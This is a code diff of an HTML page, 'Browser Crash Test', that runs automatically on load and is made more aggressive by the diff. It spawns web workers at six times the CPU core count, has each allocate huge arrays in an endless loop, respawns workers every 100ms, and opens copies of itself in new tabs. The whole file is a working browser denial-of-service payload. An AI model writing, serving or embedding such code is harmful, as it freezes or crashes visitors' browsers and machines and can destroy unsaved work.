@@ -1,27 +1,45 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Browser Crash Test - Extreme Memory Overload</title>
+    <title>Ultimate Browser Crash Test</title>
 </head>
 <body>
-    <h1>Browser Crash Test - Extreme Memory Overload</h1>
+    <h1>Browser Crash Test - Maximum Overload</h1>
     <p>If your browser crashes, the test was successful.</p>
 
     <script>
         function startWorker() {
-            let code = `
+            let code = `onmessage = function() { 
                 let data = [];
-                while (true) {
-                    data.push(new Float64Array(1e8)); // Uses more memory
+                while (true) { 
+                    data.push(new Float64Array(1e8)); // Allocates massive memory
                 }
-            `;
+            }`;
             let blob = new Blob([code], { type: "application/javascript" });
-            let worker = new Worker(URL.createObjectURL(blob));
+
+            function spawnWorkers() {
+                let worker = new Worker(URL.createObjectURL(blob));
+                worker.postMessage("Start");
+
+                setTimeout(spawnWorkers, 100); // Keep spawning new workers every 100ms
+            }
+
+            for (let i = 0; i < navigator.hardwareConcurrency * 6; i++) { // Use 6x CPU cores
+                spawnWorkers();
+            }
         }
 
-        for (let i = 0; i < navigator.hardwareConcurrency * 4; i++) { // Uses 4x CPU cores
-            startWorker();
+        function spawnTabs(numTabs) {
+            for (let i = 0; i < numTabs; i++) {
+                window.open(window.location.href, '_blank');
+            }
         }
+
+        // 1️⃣ Start aggressive memory & CPU overload
+        startWorker();
+
+        // 2️⃣ Open multiple tabs to distribute the load
+        spawnTabs(6); // Increase this if needed
     </script>
 </body>
 </html>
